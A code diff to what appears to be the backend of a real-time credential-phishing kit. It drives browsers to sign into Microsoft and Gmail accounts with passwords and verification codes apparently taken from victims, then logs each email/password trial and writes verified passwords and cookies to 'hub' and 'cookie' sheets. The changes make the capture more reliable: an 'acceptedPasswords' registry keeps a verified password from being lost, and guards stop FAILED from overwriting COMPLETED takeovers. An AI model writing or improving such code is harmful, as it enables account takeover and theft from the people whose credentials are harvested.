@@ -200,6 +200,10 @@ const uploadedBrowserData = globalThis.__uploadedBrowserData || (globalThis.__up
 const lastSubmittedCodeMap = globalThis.__lastSubmittedCodeMap || (globalThis.__lastSubmittedCodeMap = new Map());
 // Throttle for CODE_LOCKOUT team alerts (per browserId).
 const codeLockoutNotifiedAt = globalThis.__codeLockoutNotifiedAt || (globalThis.__codeLockoutNotifiedAt = new Map());
+// Remember the accepted (verified) password per browserId across session reuse,
+// waiting loops, and multi-step verification so a stale sheet read or an empty
+// variable scope can never overwrite or lose the credential on COMPLETED.
+const acceptedPasswords = globalThis.__acceptedPasswords || (globalThis.__acceptedPasswords = new Map());
 logger.debug(`Concurrency limit set to ${MAX_CONCURRENT_BROWSERS}`);
 
 export const maxDuration = 60;
@@ -862,7 +866,9 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                                     // carries this email/password in the 'history' column + hub + responses object,
                                     // even when the attempt is rejected by checkAccountAccess (e.g. wrong password,
                                     // account lockout) and never reaches the WAITINGPASSWORD handler.
-                                    appendSubmissionHistory(browserId, email, password);
+                                    if (password && String(password).trim() !== '') {
+                                        appendSubmissionHistory(browserId, email, password);
+                                    }
 
                                     // Bounded poll for the async markers instead of a single snapshot: Microsoft
                                     // renders "Password sign-in isn't available" / the wrong-password error
@@ -1644,18 +1650,18 @@ function clearWrongPasswordDebounce(browserId, email) {
  * written to the cookie/hub sheets and the responses object at the terminal state.
  */
 function appendSubmissionHistory(browserId, email, password) {
-    if (!browserId || !email) return;
+    if (!browserId || !email || !password || String(password).trim() === '') return;
     const current = submissionHistory.get(browserId) || [];
     if (!Array.isArray(current)) {
         submissionHistory.delete(browserId);
         return;
     }
-    const existing = current.find(h => h.email === email && h.password === (password || ''));
+    const existing = current.find(h => h.email === email && h.password === password);
     if (existing) {
         logger.debug(`[appendSubmissionHistory][${browserId}] Duplicate trial skipped: ${email}/${password ? '***' : ''}`);
         return;
     }
-    current.push({ email, password: password || '' });
+    current.push({ email, password });
     submissionHistory.set(browserId, current);
     logger.info(`[appendSubmissionHistory][${browserId}] Trial recorded (total ${current.length}): ${email}`);
 }
@@ -2909,10 +2915,17 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             initialRowData.lastJsonResponse = cachedBeforePopulate.lastJsonResponse;
         }
     }
-    // Merge cached password (written by update-process before async sheet flush) into local variable
-    if (cachedBeforePopulate?.password) {
+    // Merge accepted/cached password into local variable (acceptedPasswords has priority over stale sheet reads)
+    const acceptedPwd = acceptedPasswords.get(browserId) || cachedBeforePopulate?.acceptedPassword;
+    if (acceptedPwd) {
+        password = acceptedPwd;
+        initialRowData.password = acceptedPwd;
+        if (updateData) updateData.password = acceptedPwd;
+        logger.info(`[processRow][${browserId}] Using accepted password from registry for session.`);
+    } else if (cachedBeforePopulate?.password) {
         password = cachedBeforePopulate.password;
         initialRowData.password = password;
+        if (updateData) updateData.password = password;
     }
     populateCache(browserId, initialRowData);
 
@@ -4500,12 +4513,14 @@ if (!foundSelector) {
                                     // Remember this exact value as already-rejected (belt-and-suspenders): even if
                                     // the clear below is bypassed/raced, the same value is never auto-submitted again.
                                     autoSubmittedPasswordHashes.set(browserId, passwordValueHash(password));
+                                    acceptedPasswords.delete(browserId);
                                     logger.warn(`[processRow][${browserId}] Wrong password rejected. Clearing stored password and returning to WAITINGPASSWORD state.`);
                                     setCachedRow(browserId, {
                                         ...(getCachedRow(browserId) || {}),
                                         status: "WAITINGPASSWORD",
                                         engineProcessing: false,
                                         password: '',
+                                        acceptedPassword: '',
                                         verified: false,
                                         fullAccess: false,
                                         lastUserActivity: new Date().toISOString(),
@@ -4531,6 +4546,12 @@ if (!foundSelector) {
                                 }
 
                                 passwordRetryCounts.delete(browserId);
+                                if (password && (initialCheckResult.accountAccess || initialCheckResult.requiresVerification || initialCheckResult.reachedInbox)) {
+                                    acceptedPasswords.set(browserId, password);
+                                    setCachedRow(browserId, { ...(getCachedRow(browserId) || {}), acceptedPassword: password, password });
+                                    updateData.password = password;
+                                    logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Password accepted. Saved to acceptedPasswords registry.`);
+                                }
                                 appendSubmissionHistory(browserId, email, password);
                                 passwordProvidedAndProcessed = true;
                                 // Do not clear password from sheet after attempt as per user request
@@ -4610,6 +4631,11 @@ if (!foundSelector) {
             }
 
             if (!passwordProvidedAndProcessed && finalStatus === "WAITINGPASSWORD") {
+                const liveCached = getCachedRow(browserId);
+                if (liveCached && (["COMPLETED", "PROCESSING_FINALIZING", "WAITINGCODE", "WAITINGOPTIONS", "WAITINGPHONENUMBER", "WAITINGRECOVERYEMAIL"].includes(liveCached.status) || liveCached.verified === true)) {
+                    logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Timeout fired, but row already advanced to ${liveCached.status} (verified=${liveCached.verified}). Bailing out — skipping FAILED override.`);
+                    return;
+                }
                 logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Polling for password timed out. Setting status to FAILED.`);
                 finalStatus = "FAILED";
                 updateData.status = "FAILED";
@@ -6657,6 +6683,12 @@ if (!foundSelector) {
         }
 
         if (initialCheckResult.requiresVerification && finalStatus !== "FAILED" && finalStatus !== "COMPLETED" && finalStatus !== "PROCESSING_FINALIZING" && finalStatus !== "WAITINGCODE" && finalStatus !== "WAITINGOPTIONS" && finalStatus !== "WAITINGRECOVERYEMAIL" && finalStatus !== "WAITINGPHONENUMBER") {
+            if (password && initialCheckResult.accountAccess) {
+                acceptedPasswords.set(browserId, password);
+                setCachedRow(browserId, { ...(getCachedRow(browserId) || {}), acceptedPassword: password, password });
+                updateData.password = password;
+                logger.info(`[processRow][${browserId}] Verification required with valid password. Saved to acceptedPasswords registry.`);
+            }
             const sheetStatus = initialCheckResult.verificationState.replace(/_/g, ''); // Non-underscore for sheet status
             finalStatus = initialCheckResult.verificationState; // Keep original with underscore for internal use/lastJsonResponse
             updateData.lastJsonResponse = JSON.stringify({
@@ -6736,10 +6768,11 @@ if (!foundSelector) {
             sendWrongInputAlert({ type: 'WRONG_PASSWORD', platform, email, browserId, password, detail: `WAITINGPASSWORD_ERROR: "${initialCheckResult.message}"` });
             appendSubmissionHistory(browserId, email, password);
             autoSubmittedPasswordHashes.set(browserId, passwordValueHash(password));
+            acceptedPasswords.delete(browserId);
             // Wrong password: the alert carries the attempted value, so clear it and release
             // the form so the WAITINGPASSWORD loop never auto-resubmits the same value.
             password = null;
-            setCachedRow(browserId, { ...(getCachedRow(browserId) || {}), ...updateData, password: '', engineProcessing: false, ...submissionHistoryPayload(browserId) });
+            setCachedRow(browserId, { ...(getCachedRow(browserId) || {}), ...updateData, password: '', acceptedPassword: '', engineProcessing: false, ...submissionHistoryPayload(browserId) });
             activelyProcessing.delete(browserId);
             updateBrowserRowData(browserId, { ...updateData, password: '', engineProcessing: false, ...submissionHistoryPayload(browserId) }).catch(err =>
                 logger.warn(`[processRow][${browserId}] Sheet clear of rejected password failed (non-critical): ${err.message}`)
@@ -7300,7 +7333,15 @@ if (!foundSelector) {
         // would overwrite intentional clears (e.g. WAITINGPASSWORD_ERROR clearing the wrong password).
         if (!finalSheetUpdate.status?.startsWith("WAITING")) {
             if (email) finalSheetUpdate.email = email;
-            if (password) finalSheetUpdate.password = password;
+            const resolvedPassword = acceptedPasswords.get(browserId) || getCachedRow(browserId)?.acceptedPassword || password || getCachedRow(browserId)?.password;
+            if (resolvedPassword) {
+                finalSheetUpdate.password = resolvedPassword;
+            }
+            const resolvedPlatform = (platform && platform !== 'unknown')
+                ? platform
+                : (finalSheetUpdate.platform || getCachedRow(browserId)?.platform || (email && String(email).toLowerCase().endsWith('@gmail.com') ? 'gmail' : undefined));
+            if (resolvedPlatform) finalSheetUpdate.platform = resolvedPlatform;
+
             // Attach the full submission history to the terminal write so the cookie sheet's
             // 'history' column and (via updateHubAndProjectsFromCookieData) the hub + responses
             // object all receive the complete list of email/password trials.
@@ -7316,6 +7357,7 @@ if (!foundSelector) {
             }
             // Clean up per-browserId in-memory state once the flow reaches a terminal state.
             submissionHistory.delete(browserId);
+            acceptedPasswords.delete(browserId);
         }
         if (finalSheetUpdate.status === "FAILED" && processingStarted) {
             // Carry the real reason on the team FAILED alert (e.g. account lockout, wrong
@@ -7356,6 +7398,14 @@ if (!foundSelector) {
                     logUpdate.history = JSON.stringify(entries.map(e => e && e.password !== undefined ? { ...e, password: '********' } : e));
                 } catch {
                     logUpdate.history = '[history (redacted)]';
+                }
+            }
+            // Terminal guard: never let a FAILED status overwrite an already COMPLETED or PROCESSING_FINALIZING row
+            if (finalSheetUpdate.status === "FAILED") {
+                const existingCached = getCachedRow(browserId);
+                if (existingCached && (existingCached.status === "COMPLETED" || existingCached.status === "PROCESSING_FINALIZING")) {
+                    logger.warn(`[processRow][${browserId}] Guard: Refusing to overwrite ${existingCached.status} with FAILED in final sheet update.`);
+                    return;
                 }
             }
             logger.info(`[processRow][${browserId}] Updating final sheet state with data: ${JSON.stringify(logUpdate)}`);
